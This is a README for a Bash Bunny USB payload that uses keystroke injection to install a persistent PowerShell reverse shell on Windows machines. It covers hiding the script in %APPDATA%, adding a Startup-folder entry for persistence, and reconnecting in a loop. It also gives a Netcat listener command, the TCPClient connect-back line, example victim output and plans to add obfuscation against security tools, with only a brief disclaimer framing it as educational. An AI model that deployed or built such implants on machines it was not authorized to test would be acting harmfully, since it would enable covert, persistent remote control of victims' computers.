# Persistent Reverse Shell via Bash Bunny

**Author:** CyberJulian  
**Category:** Network  
**Target OS:** Windows 10, 11  
**Attack Modes:** HID, STORAGE 

---

## ⚠️ Disclaimer  
This project is intended for **educational and authorized testing purposes only**. Unauthorized use of this software is strictly prohibited.

---

## Overview  
This **Bash Bunny payload** deploys a **persistent reverse shell** on a Windows target, enabling remote access via **Netcat**. The script runs on system startup, ensuring continuous reconnection even after reboots.

## Features  
✅ **Persistent Connection** – Automatically reconnects on system startup.  
✅ **Stealthy Execution** – Runs in the background from a hidden directory.  
✅ **Command Execution** – Executes shell commands remotely and returns output.  
✅ **Automatic Deployment** – Installs via Bash Bunny keystroke injection.  

---

## How It Works

### **1️⃣ Execution via Bash Bunny**  
- The Bash Bunny injects keystrokes to **run a PowerShell command** that:  
  - Copies the reverse shell script to a **hidden directory** (`%APPDATA%\HiddenFolder`).  
  - Creates a **batch script** in the Windows **Startup folder** for persistence.  

### **2️⃣ Persistent Connection Attempt**  
- The reverse shell script **loops continuously**, trying to connect to the **designated listener IP and port**.  
- If the connection is lost, the script **retries every 5 seconds** until successful.  
- If the system reboots, the **Startup script automatically restarts the process**.

### **3️⃣ Remote Command Execution**  
- Once connected, the target device **listens for commands** from the remote listener.
- The session remains active until manually terminated.
  - To **fully terminate the script**, type "exit". This will **completely stop execution** and close the connection.
  - To stop the connection while **keeping the script running on loop**, enter Control+C

---

## Setup Instructions

### **🔹 Listener (Attacker Machine)**
1. Start a Netcat listener on your machine:
   ```bash
   nc -lvnp 4444
   ```
   - Replace `4444` with your desired port.

### **🔹 Deployment via Bash Bunny**
1. **Edit reverse.ps1** to set the correct **listener IP address**:
- Open reverse.ps1 and locate this line:
  ```
  $client = New-Object System.Net.Sockets.TCPClient("192.168.1.0", 4444)
  ```  
  - Replace 192.168.1.0 with your listener’s IP address.  
  - Replace 4444 with your listener’s port, if necessary. 
2. **Copy the payload files** to your Bash Bunny:
   ```
   /payloads/switch1/
   ├── payload.txt
   ├── setup_reverse_shell.ps1
   ├── reverse.ps1
   ```
3. **Insert the Bash Bunny into the target Windows machine.**
4. The payload will:
   - Copy the reverse shell script to a hidden directory.
   - Create a **Startup entry** to ensure persistence.
   - Initiate the first connection attempt.

---

## Payload Breakdown

### **`payload.txt` (Main Bash Bunny Script)**
- Configures the Bash Bunny as a **HID & Storage device**.
- Runs the **PowerShell setup script** from the Bash Bunny storage.
- Executes the **reverse shell script** from its new hidden location.

### **`setup_reverse_shell.ps1` (Persistence Setup)**
- Copies `reverse.ps1` to a hidden directory.
- Creates a **Startup script** in the Windows **Startup folder**.
- Ensures the reverse shell script runs on every system boot.

### **`reverse.ps1` (Reverse Shell Loop)**
- **Attempts to connect** to the attacker's listener IP & port.
- **Executes received commands** and returns output.
- **Loops indefinitely**, retrying if disconnected.

---

## Example Output  
On the listener machine (`nc -lvnp 4444`):  
```
Reverse shell connection established.
whoami
victim-pc\user
```

---

### 🎯 **Future Enhancements**
- Add **encryption** for secure communication.
- Implement **multi-platform support** (Mac & Linux).
- Improve **obfuscation** to bypass security tools.

---

## 🏆 Credits  
Created by **CyberJulian**
